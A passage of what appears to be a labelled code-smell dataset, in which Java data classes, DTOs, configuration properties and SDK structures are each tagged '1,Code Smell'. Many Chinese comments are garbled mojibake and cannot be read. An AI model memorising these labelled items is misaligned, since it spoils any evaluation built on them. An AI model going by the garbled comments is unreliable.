public class ControllerException extends RuntimeException {
  private int code;
  private String msg;
  public ControllerException(  int code,  String msg){
    this.code=code;
    this.msg=msg;
  }
  public ControllerException(  ErrorCode errorCode){
    this.code=errorCode.getCode();
    this.msg=errorCode.getMsg();
  }
  public int getCode(){
    return code;
  }
  public void setCode(  int code){
    this.code=code;
  }
  public String getMsg(){
    return msg;
  }
  public void setMsg(  String msg){
    this.msg=msg;
  }
}
",1,Code Smell
"/** 
 * @author XCXCXCXCX
 * @since 1.0
 */
@ConfigurationProperties(prefix=MaintainProperties.PREFIX) public class MaintainProperties {
  public static final String PREFIX=""skyer.maintain"";
  /** 
 * 杩愮淮璇锋眰 secretKey
 */
  private String secretKey=""skyer"";
  private MaintainInfo globalInfo=new MaintainInfo(MaintainState.NORMAL);
  /** 
 * key=serviceName value= {@link MaintainInfo}
 */
  private Map<String,MaintainInfo> serviceMaintainInfo=new HashMap<>();
  public MaintainInfo getGlobalInfo(){
    return globalInfo;
  }
  public void setGlobalInfo(  MaintainInfo globalInfo){
    this.globalInfo=globalInfo;
  }
  public Map<String,MaintainInfo> getServiceMaintainInfo(){
    return serviceMaintainInfo;
  }
  public void setServiceMaintainInfo(  Map<String,MaintainInfo> serviceMaintainInfo){
    this.serviceMaintainInfo=serviceMaintainInfo;
  }
  public String getSecretKey(){
    return secretKey;
  }
  public void setSecretKey(  String secretKey){
    this.secretKey=secretKey;
  }
public static class MaintainInfo {
    private MaintainState state;
    public MaintainInfo(){
    }
    public MaintainInfo(    MaintainState state){
      this.state=state;
    }
    public MaintainState getState(){
      return state;
    }
    public void setState(    MaintainState state){
      this.state=state;
    }
  }
  public enum MaintainState {  /** 
 * 姝ｅ父杩愯
 */
  NORMAL,   /** 
 * 鏆傚仠鎻愪緵鏈嶅姟
 */
  PAUSED,   /** 
 * 鏈嶅姟宸插仠姝紝涓嶅啀鎻愪緵鏈嶅姟
 */
  STOPPED}
}",1,Code Smell
"private static class SorobanResponse {
  public SorobanResponse(  String name,  String response){
    params.add(new SorobanParam(name,response));
  }
  public String jsonrpc=""2.0"";
  public int id=0;
  public String method=""directory.Add"";
  public List<SorobanParam> params=new ArrayList<>();
}",1,Code Smell
"/** 
 * 褰曟挱涓绘満鑾峰彇妯″紡鍑哄弬
 * @author 锛� 47040
 * @since 锛� Created in 2020/9/27 17:26
 */
public class NET_OUT_COURSECOMPOSITE_CHANNEL_MODE_GET extends NetSDKLib.SdkStructure {
  /** 
 * 缁撴瀯浣撳ぇ灏�
 */
  public int dwSize;
  /** 
 * 瀹為檯鑾峰彇鐨勬ā寮忎釜鏁�
 */
  public int nReturnNum;
  /** 
 * 妯″紡缂栧彿
 */
  public int[] nMode=new int[NET_MAX_MODE_NUMBER];
  /** 
 * 妯″紡淇℃伅
 */
  public NET_COMPOSITECHANNELMODE_INFO[] stModeInfo=new NET_COMPOSITECHANNELMODE_INFO[NET_MAX_MODE_NUMBER];
  public NET_OUT_COURSECOMPOSITE_CHANNEL_MODE_GET(){
    dwSize=this.size();
    for (int i=0; i < stModeInfo.length; i++) {
      stModeInfo[i]=new NET_COMPOSITECHANNELMODE_INFO();
    }
  }
}",1,Code Smell
"public class NotificationsPolicy extends BaseModel {
  public boolean filterNewAccounts;
  public boolean filterNotFollowers;
  public boolean filterNotFollowing;
  public boolean filterPrivateMentions;
  public Summary summary;
public static class Summary {
    public int pendingNotificationsCount;
    public int pendingRequestsCount;
  }
}
",1,Code Smell
"/** 
 * @author harris
 */
public class CloudTaskCopyDTO {
  private List<CloudTaskItem> cloudTaskItemList;
  private Rule rule;
  private List<String> ruleTagMappingList;
  private List<SelectTag> SelectTags=new LinkedList<>();
  public List<CloudTaskItem> getCloudTaskItemList(){
    return cloudTaskItemList;
  }
  public void setCloudTaskItemList(  List<CloudTaskItem> cloudTaskItemList){
    this.cloudTaskItemList=cloudTaskItemList;
  }
  public Rule getRule(){
    return rule;
  }
  public void setRule(  Rule rule){
    this.rule=rule;
  }
  public List<SelectTag> getSelectTags(){
    return SelectTags;
  }
  public void setSelectTags(  List<SelectTag> selectTags){
    SelectTags=selectTags;
  }
  public List<String> getRuleTagMappingList(){
    return ruleTagMappingList;
  }
  public void setRuleTagMappingList(  List<String> ruleTagMappingList){
    this.ruleTagMappingList=ruleTagMappingList;
  }
}
",1,Code Smell
"/** 
 * 鏀粯鍚庤繑鍥炵殑涓�浜涘熀纭�鏁版嵁
 * @author FrozenWatermelon
 * @date 2020/12/25
 */
public class PayInfoResultBO {
  /** 
 * 鍟嗗煄鏀粯鍗曞彿
 */
  private Long payId;
  /** 
 * 绗笁鏂硅鍗曟祦姘村彿
 */
  private String bizPayNo;
  /** 
 * 鏄惁鏀粯鎴愬姛
 */
  private Integer isPaySuccess;
  /** 
 * 鏀粯鎴愬姛鐨勬爣璁�
 */
  private String successString;
  /** 
 * 鏀粯閲戦
 */
  private Long payAmount;
  /** 
 * 鍥炶皟鍐呭
 */
  private String callbackContent;
  public Long getPayId(){
    return payId;
  }
  public void setPayId(  Long payId){
    this.payId=payId;
  }
  public String getBizPayNo(){
    return bizPayNo;
  }
  public void setBizPayNo(  String bizPayNo){
    this.bizPayNo=bizPayNo;
  }
  public Integer getIsPaySuccess(){
    return isPaySuccess;
  }
  public void setIsPaySuccess(  Integer isPaySuccess){
    this.isPaySuccess=isPaySuccess;
  }
  public String getSuccessString(){
    return successString;
  }
  public void setSuccessString(  String successString){
    this.successString=successString;
  }
  public Long getPayAmount(){
    return payAmount;
  }
  public void setPayAmount(  Long payAmount){
    this.payAmount=payAmount;
  }
  public String getCallbackContent(){
    return callbackContent;
  }
  public void setCallbackContent(  String callbackContent){
    this.callbackContent=callbackContent;
  }
  @Override public String toString(){
    return ""PayInfoResultBO{"" + ""payId="" + payId + "", bizPayNo='""+ bizPayNo+ '\''+ "", isPaySuccess=""+ isPaySuccess+ "", successString='""+ successString+ '\''+ "", payAmount=""+ payAmount+ "", callbackContent='""+ callbackContent+ '\''+ '}';
  }
}",1,Code Smell
"public static class CapitalLimitMonenyDTO {
  private BigDecimal maxChargeMoney;
  private BigDecimal minChargeMoney;
  private BigDecimal maxWithdrawMoney;
  private BigDecimal minWithdrawMoney;
  public BigDecimal getMaxChargeMoney(){
    return maxChargeMoney;
  }
  public void setMaxChargeMoney(  BigDecimal maxChargeMoney){
    this.maxChargeMoney=maxChargeMoney;
  }
  public BigDecimal getMinChargeMoney(){
    return minChargeMoney;
  }
  public void setMinChargeMoney(  BigDecimal minChargeMoney){
    this.minChargeMoney=minChargeMoney;
  }
  public BigDecimal getMaxWithdrawMoney(){
    return maxWithdrawMoney;
  }
  public void setMaxWithdrawMoney(  BigDecimal maxWithdrawMoney){
    this.maxWithdrawMoney=maxWithdrawMoney;
  }
  public BigDecimal getMinWithdrawMoney(){
    return minWithdrawMoney;
  }
  public void setMinWithdrawMoney(  BigDecimal minWithdrawMoney){
    this.minWithdrawMoney=minWithdrawMoney;
  }
}
",1,Code Smell
"public static class Bean6 {
  public int id;
  public String name;
}
public static class Bean6 {
  public int a;
  public int b;
  public int c;
  public int d;
  public int e;
  public int f;
  public int g;
  public int h;
  public int i;
  public int j;
  public int k;
}
public static class Bean6 {
  @JSONField(format=""#.00"") public Double value;
}",1,Code Smell
"/** 
 * @author xiongxy
 * @email 1179705413@qq.com
 * @date 2023-04-18 11:08:54
 */
public class UserFeedbackDO implements Serializable {
  private static final long serialVersionUID=1L;
  @JsonSerialize(using=LongToStringSerializer.class) private Long id;
  @JsonSerialize(using=LongToStringSerializer.class) private Long userId;
  private String content;
  @DateTimeFormat(pattern=""yyyy-MM-dd HH:mm:ss"") private Date createTime;
  private String userName;
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  /** 
 * 璁剧疆锛氫富閿甶d
 */
  public void setId(  Long id){
    this.id=id;
  }
  /** 
 * 鑾峰彇锛氫富閿甶d
 */
  public Long getId(){
    return id;
  }
  /** 
 * 璁剧疆锛氱敤鎴穒d
 */
  public void setUserId(  Long userId){
    this.userId=userId;
  }
  /** 
 * 鑾峰彇锛氱敤鎴穒d
 */
  public Long getUserId(){
    return userId;
  }
  /** 
 * 璁剧疆锛氬弽棣堝唴瀹
 */
  public void setContent(  String content){
    this.content=content;
  }
  /** 
 * 鑾峰彇锛氬弽棣堝唴瀹
 */
  public String getContent(){
    return content;
  }
  /** 
 * 璁剧疆锛氬弽棣堟椂闂
 */
  public void setCreateTime(  Date createTime){
    this.createTime=createTime;
  }
  /** 
 * 鑾峰彇锛氬弽棣堟椂闂
 */
  public Date getCreateTime(){
    return createTime;
  }
}",1,Code Smell
"/** 
 * <p> 鐢ㄦ埛璇勮 </p>
 * @author xiongxiaoyang
 * @date 2022/05/11
 */
@TableName(""user_comment"") public class UserComment implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * 涓婚敭
 */
  @TableId(value=""id"",type=IdType.AUTO) private Long id;
  /** 
 * 璇勮鐢ㄦ埛ID
 */
  private Long userId;
  /** 
 * 璇勮灏忚ID
 */
  private Long bookId;
  /** 
 * 璇勪环鍐呭
 */
  private String commentContent;
  /** 
 * 鍥炲鏁伴噺
 */
  private Integer replyCount;
  /** 
 * 瀹℃牳鐘舵;0-寰呭鏍 1-瀹℃牳閫氳繃 2-瀹℃牳涓嶉氳繃
 */
  private Integer auditStatus;
  /** 
 * 鍒涘缓鏃堕棿
 */
  private LocalDateTime createTime;
  /** 
 * 鏇存柊鏃堕棿
 */
  private LocalDateTime updateTime;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Long getUserId(){
    return userId;
  }
  public void setUserId(  Long userId){
    this.userId=userId;
  }
  public Long getBookId(){
    return bookId;
  }
  public void setBookId(  Long bookId){
    this.bookId=bookId;
  }
  public String getCommentContent(){
    return commentContent;
  }
  public void setCommentContent(  String commentContent){
    this.commentContent=commentContent;
  }
  public Integer getReplyCount(){
    return replyCount;
  }
  public void setReplyCount(  Integer replyCount){
    this.replyCount=replyCount;
  }
  public Integer getAuditStatus(){
    return auditStatus;
  }
  public void setAuditStatus(  Integer auditStatus){
    this.auditStatus=auditStatus;
  }
  public LocalDateTime getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  LocalDateTime createTime){
    this.createTime=createTime;
  }
  public LocalDateTime getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  LocalDateTime updateTime){
    this.updateTime=updateTime;
  }
  @Override public String toString(){
    return ""UserComment{"" + ""id="" + id + "", userId=""+ userId+ "", bookId=""+ bookId+ "", commentContent=""+ commentContent+ "", replyCount=""+ replyCount+ "", auditStatus=""+ auditStatus+ "", createTime=""+ createTime+ "", updateTime=""+ updateTime+ ""}"";
  }
}",1,Code Smell
"public static class Data {
  public List<Clipboard> list;
}
public static class Data {
  public String title;
  public int id;
  public int key;
  public boolean isEg=false;
  public int backColor=-1;
  public boolean isBackAnim=false;
}
public static class Data {
  private String id;
  private String name;
  private String ip;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getIp(){
    return ip;
  }
  public void setIp(  String ip){
    this.ip=ip;
  }
}
public static class Data {
  public List<DataNum> list;
}",1,Code Smell
"/** 
 * @author harris
 */
public class ServerListDTO extends Server {
  private String user;
  private String groupName;
  private Integer riskSum;
  private String resultStatus;
  private ServerLynisResultWithBLOBs serverLynisResult;
  private List<ServerLynisResultDetailDTO> serverLynisResultDetails;
  private List<ServerLynisResultDetailDTO> serverLynisWarnings;
  private List<ServerLynisResultDetailDTO> serverLynisSuggestions;
  private List<ServerResultDTO> serverResultDTOS;
  public String getUser(){
    return user;
  }
  public void setUser(  String user){
    this.user=user;
  }
  public String getGroupName(){
    return groupName;
  }
  public void setGroupName(  String groupName){
    this.groupName=groupName;
  }
  public Integer getRiskSum(){
    return riskSum;
  }
  public void setRiskSum(  Integer riskSum){
    this.riskSum=riskSum;
  }
  public List<ServerResultDTO> getServerResultDTOS(){
    return serverResultDTOS;
  }
  public void setServerResultDTOS(  List<ServerResultDTO> serverResultDTOS){
    this.serverResultDTOS=serverResultDTOS;
  }
  public String getResultStatus(){
    return resultStatus;
  }
  public void setResultStatus(  String resultStatus){
    this.resultStatus=resultStatus;
  }
  public ServerLynisResultWithBLOBs getServerLynisResult(){
    return serverLynisResult;
  }
  public void setServerLynisResult(  ServerLynisResultWithBLOBs serverLynisResult){
    this.serverLynisResult=serverLynisResult;
  }
  public List<ServerLynisResultDetailDTO> getServerLynisResultDetails(){
    return serverLynisResultDetails;
  }
  public void setServerLynisResultDetails(  List<ServerLynisResultDetailDTO> serverLynisResultDetails){
    this.serverLynisResultDetails=serverLynisResultDetails;
  }
  public List<ServerLynisResultDetailDTO> getServerLynisWarnings(){
    return serverLynisWarnings;
  }
  public void setServerLynisWarnings(  List<ServerLynisResultDetailDTO> serverLynisWarnings){
    this.serverLynisWarnings=serverLynisWarnings;
  }
  public List<ServerLynisResultDetailDTO> getServerLynisSuggestions(){
    return serverLynisSuggestions;
  }
  public void setServerLynisSuggestions(  List<ServerLynisResultDetailDTO> serverLynisSuggestions){
    this.serverLynisSuggestions=serverLynisSuggestions;
  }
}
",1,Code Smell
"public static class NET_UAVCMD_NAV_GUIDED extends SdkStructure {
  public NET_UAVCMD_COMMON stuCommon;
  public float fLatitude;
  public float fLongitude;
  public float fAltitude;
  public byte[] byReserved=new byte[16];
}",1,Code Smell
"public static class Model {
  private String code;
  private LocalDateTime expireTime;
  public String getCode(){
    return code;
  }
  public void setCode(  String code){
    this.code=code;
  }
  public LocalDateTime getExpireTime(){
    return expireTime;
  }
  public void setExpireTime(  LocalDateTime expireTime){
    this.expireTime=expireTime;
  }
  public Model(  String code,  int expireIn){
    this.code=code;
    this.expireTime=LocalDateTime.now().plusSeconds(expireIn);
  }
  @JSONCreator public Model(  String code,  LocalDateTime expireTime){
    this.code=code;
    this.expireTime=expireTime;
  }
  public boolean isExpried(){
    return LocalDateTime.now().isAfter(getExpireTime());
  }
}
@Getter @Setter @ToString public static class Model {
  private Date oldDate;
}
public static class Model {
  private final long offset;
  private final long timestamp;
  public Model(  long offset,  long timestamp){
    this.offset=offset;
    this.timestamp=timestamp;
  }
  /** 
 * 杩欑 绫讳技鐨� get 鏂规硶涓嶆瑙勶紝娌″姙娉曠‘瀹氶偅涓柟娉曟墠绠楁槸鑾峰彇鍙傛暟鐨勬帴鍙ｏ紝鍙互鍙傝�冧緥瀛� 3
 */
  public long timestamp(){
    return timestamp;
  }
  public long offset(){
    return this.offset;
  }
}",1,Code Smell
"/** 
 * @author FrozenWatermelon
 * @date 2020-11-20 15:47:32
 */
public class ChangeShopCartItemDTO {
  @Schema(description=""璐墿杞D"",requiredMode=Schema.RequiredMode.REQUIRED) private Long shopCartItemId;
  @NotNull(message=""鍟嗗搧ID涓嶈兘涓虹┖"") @Schema(description=""鍟嗗搧ID"",requiredMode=Schema.RequiredMode.REQUIRED) private Long spuId;
  @Schema(description=""鏃х殑skuId 濡傛灉浼犺繃鏉ヨ鏄庡湪鍙樻洿sku"",requiredMode=Schema.RequiredMode.REQUIRED) private Long oldSkuId;
  @NotNull(message=""skuId涓嶈兘涓虹┖"") @Schema(description=""skuId"",requiredMode=Schema.RequiredMode.REQUIRED) private Long skuId;
  @Schema(description=""搴楅摵ID锛屽墠绔笉鐢ㄤ紶璇ュ瓧娈�"") private Long shopId;
  @NotNull(message=""鍟嗗搧涓暟涓嶈兘涓虹┖"") @Schema(description=""鍟嗗搧涓暟"",requiredMode=Schema.RequiredMode.REQUIRED) private Integer count;
  @Schema(description=""鍟嗗搧鏄惁鍕鹃�� true锛氬嬀閫� "") private Boolean isCheck;
  public Long getShopCartItemId(){
    return shopCartItemId;
  }
  public void setShopCartItemId(  Long shopCartItemId){
    this.shopCartItemId=shopCartItemId;
  }
  public Long getSpuId(){
    return spuId;
  }
  public void setSpuId(  Long spuId){
    this.spuId=spuId;
  }
  public Long getSkuId(){
    return skuId;
  }
  public void setSkuId(  Long skuId){
    this.skuId=skuId;
  }
  public Long getShopId(){
    return shopId;
  }
  public void setShopId(  Long shopId){
    this.shopId=shopId;
  }
  public Integer getCount(){
    return count;
  }
  public void setCount(  Integer count){
    this.count=count;
  }
  public Boolean getCheck(){
    return isCheck;
  }
  public void setCheck(  Boolean check){
    isCheck=check;
  }
  public Long getOldSkuId(){
    return oldSkuId;
  }
  public void setOldSkuId(  Long oldSkuId){
    this.oldSkuId=oldSkuId;
  }
  @Override public String toString(){
    return ""ChangeShopCartItemDTO{"" + ""shopCartItemId="" + shopCartItemId + "", spuId=""+ spuId+ "", oldSkuId=""+ oldSkuId+ "", skuId=""+ skuId+ "", shopId=""+ shopId+ "", count=""+ count+ "", isCheck=""+ isCheck+ '}';
  }
}",1,Code Smell
"/** 
 * ProxyNodeInfo
 */
public class ProxyNodeInfo {
  private String nodeIp;
  private int nodePort;
  /** 
 * get nodeIp
 * @return the nodeIp
 */
  public String getNodeIp(){
    return nodeIp;
  }
  /** 
 * set nodeIp
 * @param nodeIp the nodeIp to set
 */
  public void setNodeIp(  String nodeIp){
    this.nodeIp=nodeIp;
  }
  /** 
 * get nodePort
 * @return the nodePort
 */
  public int getNodePort(){
    return nodePort;
  }
  /** 
 * set nodePort
 * @param nodePort the nodePort to set
 */
  public void setNodePort(  int nodePort){
    this.nodePort=nodePort;
  }
}
",1,Code Smell
"@ApiModel(""鏁版嵁婧愬垪琛ㄦ煡璇㈠弬鏁�"") public class DsTableListBySchemaParam extends PubSvcBaseParam {
  @ApiModelProperty(value=""鏁版嵁婧怚d"") private Long sourceId;
  @ApiModelProperty(value=""schema"") private String schema;
  @ApiModelProperty(value=""妯＄硦鏌ヨtableName"") private String searchKey;
  public Long getSourceId(){
    return sourceId;
  }
  public void setSourceId(  Long sourceId){
    this.sourceId=sourceId;
  }
  public String getSchema(){
    return schema;
  }
  public void setSchema(  String schema){
    this.schema=schema;
  }
  public String getSearchKey(){
    return searchKey;
  }
  public void setSearchKey(  String searchKey){
    this.searchKey=searchKey;
  }
}
",1,Code Smell
"public class AuthenticateResponse {
  public String accessToken;
  public UUID clientToken;
  public Profile[] availableProfiles;
  public Profile selectedProfile;
}
",1,Code Smell
"public class NET_DVR_IPCHANINFO_V40 extends Structure {
  public byte byEnable;
  public byte byRes1;
  public short wIPID;
  public int dwChannel;
  public byte byTransProtocol;
  public byte byTransMode;
  public byte byFactoryType;
  public byte[] byRes=new byte[241];
}",1,Code Smell
"public static class EM_DEV_PROTOCOL_TYPE extends SdkStructure {
  public static final int EM_DEV_PROTOCOL_UNKNOWN=0;
  public static final int EM_DEV_PROTOCOL_V2=1;
  public static final int EM_DEV_PROTOCOL_V3=2;
  public static final int EM_DEV_PROTOCOL_ONVIF=3;
  public static final int EM_DEV_PROTOCOL_GENERAL=4;
  public static final int EM_DEV_PROTOCOL_GB28181=5;
  public static final int EM_DEV_PROTOCOL_EHOME=6;
  public static final int EM_DEV_PROTOCOL_HIKVISION=7;
  public static final int EM_DEV_PROTOCOL_BSCP=8;
}",1,Code Smell
"public static class Email extends AutoSafeParcelable {
  @SafeParceled(1) public int type;
  @SafeParceled(2) public String address;
  @SafeParceled(3) public String subject;
  @SafeParceled(4) public String body;
  public static final Creator<Email> CREATOR=new AutoCreator<>(Email.class);
}",1,Code Smell
"public static class DEV_EVENT_TRAFFIC_PARKINGONYELLOWBOX_INFO extends SdkStructure {
  public int nChannelID;
  public byte[] szName=new byte[128];
  public byte[] bReserved1=new byte[8];
  public int PTS;
  public NET_TIME_EX UTC;
  public int nEventID;
  public int nLane;
  public NET_MSG_OBJECT stuObject;
  public NET_MSG_OBJECT stuVehicle;
  public NET_EVENT_FILE_INFO stuFileInfo;
  public int nInterval1;
  public int nInterval2;
  public int nFollowTime;
  public byte bEventAction;
  public byte[] byReserved=new byte[2];
  public byte byImageIndex;
  public int dwSnapFlagMask;
  public NET_RESOLUTION_INFO stuResolution;
  public DEV_EVENT_TRAFFIC_TRAFFICCAR_INFO stTrafficCar;
  public NET_GPS_INFO stuGPSInfo;
  public byte[] bReserved=new byte[984];
  public EVENT_COMM_INFO stCommInfo;
}",1,Code Smell
"/** 
 * @author Rahul Mittal
 * @since 1.0.0
 */
@ConfigurationProperties(HanaCloudVectorStoreProperties.CONFIG_PREFIX) public class HanaCloudVectorStoreProperties {
  public static final String CONFIG_PREFIX=""spring.ai.vectorstore.hanadb"";
  private String tableName;
  private int topK;
  public String getTableName(){
    return tableName;
  }
  public void setTableName(  String tableName){
    this.tableName=tableName;
  }
  public int getTopK(){
    return topK;
  }
  public void setTopK(  int topK){
    this.topK=topK;
  }
}",1,Code Smell
"public final class RichTextContent {
  RichTextAtContent atContent;
  RichTextChannelContent channelContent;
  RichTextEmojiContent emojiContent;
  String patternId;
  RichTextTextContent textContent;
  RICHTEXTCONTENTTYPE type;
  RichTextURLContent urlContent;
  public RichTextContent(){
    this.type=RICHTEXTCONTENTTYPE.values()[0];
    this.patternId="""";
  }
  public RichTextAtContent getAtContent(){
    return this.atContent;
  }
  public RichTextChannelContent getChannelContent(){
    return this.channelContent;
  }
  public RichTextEmojiContent getEmojiContent(){
    return this.emojiContent;
  }
  public String getPatternId(){
    return this.patternId;
  }
  public RichTextTextContent getTextContent(){
    return this.textContent;
  }
  public RICHTEXTCONTENTTYPE getType(){
    return this.type;
  }
  public RichTextURLContent getUrlContent(){
    return this.urlContent;
  }
  public String toString(){
    return ""RichTextContent{type="" + this.type + "",patternId=""+ this.patternId+ "",textContent=""+ this.textContent+ "",emojiContent=""+ this.emojiContent+ "",atContent=""+ this.atContent+ "",urlContent=""+ this.urlContent+ "",channelContent=""+ this.channelContent+ "",}"";
  }
  public RichTextContent(  RICHTEXTCONTENTTYPE richtextcontenttype,  String str,  RichTextTextContent richTextTextContent,  RichTextEmojiContent richTextEmojiContent,  RichTextAtContent richTextAtContent,  RichTextURLContent richTextURLContent,  RichTextChannelContent richTextChannelContent){
    this.type=RICHTEXTCONTENTTYPE.values()[0];
    this.patternId="""";
    this.type=richtextcontenttype;
    this.patternId=str;
    this.textContent=richTextTextContent;
    this.emojiContent=richTextEmojiContent;
    this.atContent=richTextAtContent;
    this.urlContent=richTextURLContent;
    this.channelContent=richTextChannelContent;
  }
}",1,Code Smell
"/** 
 * @author FrozenWatermelon
 * @date 2020/9/2
 */
public class ShopUserVO {
  /** 
 * shopUserId
 */
  @Schema(description=""搴楅摵鐢ㄦ埛id"") private Long shopUserId;
  /** 
 * 鏄电О
 */
  @Schema(description=""鏄电О"") private String nickName;
  /** 
 * 鍛樺伐缂栧彿
 */
  @Schema(description=""鍛樺伐缂栧彿"") private String code;
  /** 
 * 鑱旂郴鏂瑰紡
 */
  @Schema(description=""鑱旂郴鏂瑰紡"") private String phoneNum;
  @Schema(description=""鏄惁宸茬粡鏈夎处鍙蜂簡"") private Integer hasAccount;
  @Schema(description=""搴楅摵id"") private Long shopId;
  @Schema(description=""瑙掕壊id鍒楄〃"") private List<Long> roleIds;
  public String getNickName(){
    return nickName;
  }
  public void setNickName(  String nickName){
    this.nickName=nickName;
  }
  public String getCode(){
    return code;
  }
  public void setCode(  String code){
    this.code=code;
  }
  public String getPhoneNum(){
    return phoneNum;
  }
  public void setPhoneNum(  String phoneNum){
    this.phoneNum=phoneNum;
  }
  public Long getShopUserId(){
    return shopUserId;
  }
  public void setShopUserId(  Long shopUserId){
    this.shopUserId=shopUserId;
  }
  public Integer getHasAccount(){
    return hasAccount;
  }
  public void setHasAccount(  Integer hasAccount){
    this.hasAccount=hasAccount;
  }
  public List<Long> getRoleIds(){
    return roleIds;
  }
  public void setRoleIds(  List<Long> roleIds){
    this.roleIds=roleIds;
  }
  public Long getShopId(){
    return shopId;
  }
  public void setShopId(  Long shopId){
    this.shopId=shopId;
  }
  @Override public String toString(){
    return ""ShopUserVO{"" + ""shopUserId="" + shopUserId + "", nickName='""+ nickName+ '\''+ "", code='""+ code+ '\''+ "", phoneNum='""+ phoneNum+ '\''+ "", hasAccount=""+ hasAccount+ "", shopId=""+ shopId+ "", roleIds=""+ roleIds+ '}';
  }
}",1,Code Smell
"/** 
 * harris
 */
public class K8sImage {
  private List<NameSpaceImage> nameSpaceImages;
  private Integer images;
  private Integer nameSpaces;
  private Integer riskController;
  private Integer controllers;
  private Integer critical;
  private Integer high;
  private Integer medium;
  private Integer low;
  private Integer unknown;
  private String k8sId;
  public List<NameSpaceImage> getNameSpaceImages(){
    return nameSpaceImages;
  }
  public void setNameSpaceImages(  List<NameSpaceImage> nameSpaceImages){
    this.nameSpaceImages=nameSpaceImages;
  }
  public Integer getNameSpaces(){
    return nameSpaces;
  }
  public void setNameSpaces(  Integer nameSpaces){
    this.nameSpaces=nameSpaces;
  }
  public Integer getRiskController(){
    return riskController;
  }
  public void setRiskController(  Integer riskController){
    this.riskController=riskController;
  }
  public Integer getControllers(){
    return controllers;
  }
  public void setControllers(  Integer controllers){
    this.controllers=controllers;
  }
  public Integer getCritical(){
    return critical;
  }
  public void setCritical(  Integer critical){
    this.critical=critical;
  }
  public Integer getHigh(){
    return high;
  }
  public void setHigh(  Integer high){
    this.high=high;
  }
  public Integer getMedium(){
    return medium;
  }
  public void setMedium(  Integer medium){
    this.medium=medium;
  }
  public Integer getLow(){
    return low;
  }
  public void setLow(  Integer low){
    this.low=low;
  }
  public Integer getUnknown(){
    return unknown;
  }
  public void setUnknown(  Integer unknown){
    this.unknown=unknown;
  }
  public String getK8sId(){
    return k8sId;
  }
  public void setK8sId(  String k8sId){
    this.k8sId=k8sId;
  }
  public Integer getImages(){
    return images;
  }
  public void setImages(  Integer images){
    this.images=images;
  }
}",1,Code Smell
"@ApiModel(""鍑芥暟鐩綍缁撴灉淇℃伅"") public class DevelopFunctionCatalogueVO {
  @ApiModelProperty(value=""鐖剁洰褰�"") private DevelopFunctionCatalogueVO parentCatalogue;
  @ApiModelProperty(value=""鑺傜偣鍚嶇О"",example=""a"") private String nodeName;
  @ApiModelProperty(value=""鑺傜偣鐖秈d"",example=""3"") private Long nodePid;
  @ApiModelProperty(value=""鐩綍灞傜骇 0:涓�绾� 1:浜岀骇 n:n+1绾�"",example=""1"") private Integer level;
  @ApiModelProperty(value=""鍒涘缓鐢ㄦ埛"") private Long createUserId;
  @ApiModelProperty(value=""engine绫诲瀷"",example=""1"") private Integer engineType;
  @ApiModelProperty(value=""鑺傜偣鍊�"",example=""1"") private Integer orderVal;
  @ApiModelProperty(value=""鐩綍绫诲瀷"",example=""1"") private Integer catalogueType;
  public DevelopFunctionCatalogueVO getParentCatalogue(){
    return parentCatalogue;
  }
  public void setParentCatalogue(  DevelopFunctionCatalogueVO parentCatalogue){
    this.parentCatalogue=parentCatalogue;
  }
  public String getNodeName(){
    return nodeName;
  }
  public void setNodeName(  String nodeName){
    this.nodeName=nodeName;
  }
  public Long getNodePid(){
    return nodePid;
  }
  public void setNodePid(  Long nodePid){
    this.nodePid=nodePid;
  }
  public Integer getLevel(){
    return level;
  }
  public void setLevel(  Integer level){
    this.level=level;
  }
  public Long getCreateUserId(){
    return createUserId;
  }
  public void setCreateUserId(  Long createUserId){
    this.createUserId=createUserId;
  }
  public Integer getEngineType(){
    return engineType;
  }
  public void setEngineType(  Integer engineType){
    this.engineType=engineType;
  }
  public Integer getOrderVal(){
    return orderVal;
  }
  public void setOrderVal(  Integer orderVal){
    this.orderVal=orderVal;
  }
  public Integer getCatalogueType(){
    return catalogueType;
  }
  public void setCatalogueType(  Integer catalogueType){
    this.catalogueType=catalogueType;
  }
}",1,Code Smell
"/** 
 * This class represents a nullable heap map column vector.
 */
public class HeapMapColumnVector extends AbstractHeapVector implements WritableColumnVector {
  private long[] offsets;
  private long[] lengths;
  private int size;
  private ColumnVector keys;
  private ColumnVector values;
  public HeapMapColumnVector(  int len,  ColumnVector keys,  ColumnVector values){
    super(len);
    size=0;
    offsets=new long[len];
    lengths=new long[len];
    this.keys=keys;
    this.values=values;
  }
  public void setOffsets(  long[] offsets){
    this.offsets=offsets;
  }
  public void setLengths(  long[] lengths){
    this.lengths=lengths;
  }
  public void setKeys(  ColumnVector keys){
    this.keys=keys;
  }
  public void setValues(  ColumnVector values){
    this.values=values;
  }
  public int getSize(){
    return size;
  }
  public void setSize(  int size){
    this.size=size;
  }
  public MapData getMap(  int i){
    long offset=offsets[i];
    long length=lengths[i];
    return new ColumnarMapData(keys,values,(int)offset,(int)length);
  }
}",1,Code Smell
"/** 
 * xxl-job甯搁噺淇℃伅
 * @author 3y
 */
public class XxlJobConstant {
  /** 
 * 浠诲姟淇℃伅鎺ュ彛璺緞
 */
  public static final String LOGIN_URL=""/login"";
  public static final String INSERT_URL=""/jobinfo/add"";
  public static final String UPDATE_URL=""/jobinfo/update"";
  public static final String DELETE_URL=""/jobinfo/remove"";
  public static final String RUN_URL=""/jobinfo/start"";
  public static final String STOP_URL=""/jobinfo/stop"";
  /** 
 * 鎵ц鍣ㄧ粍鎺ュ彛璺緞
 */
  public static final String JOB_GROUP_PAGE_LIST=""/jobgroup/pageList"";
  public static final String JOB_GROUP_INSERT_URL=""/jobgroup/save"";
  /** 
 * 鎵ц浠诲姟鍚嶇О
 */
  public static final String JOB_HANDLER_NAME=""austinJob"";
  /** 
 * 瓒呮椂鏃堕棿
 */
  public static final Integer TIME_OUT=120;
  /** 
 * 澶辫触閲嶈瘯娆℃暟
 */
  public static final Integer RETRY_COUNT=0;
  /** 
 * 绔嬪嵆鎵ц鐨勪换鍔� 寤惰繜鏃堕棿(绉掓暟)
 */
  public static final Integer DELAY_TIME=10;
  /** 
 * 璇锋眰 xxl-job-admin 闇�瑕佺敤鍒扮殑 cookie
 */
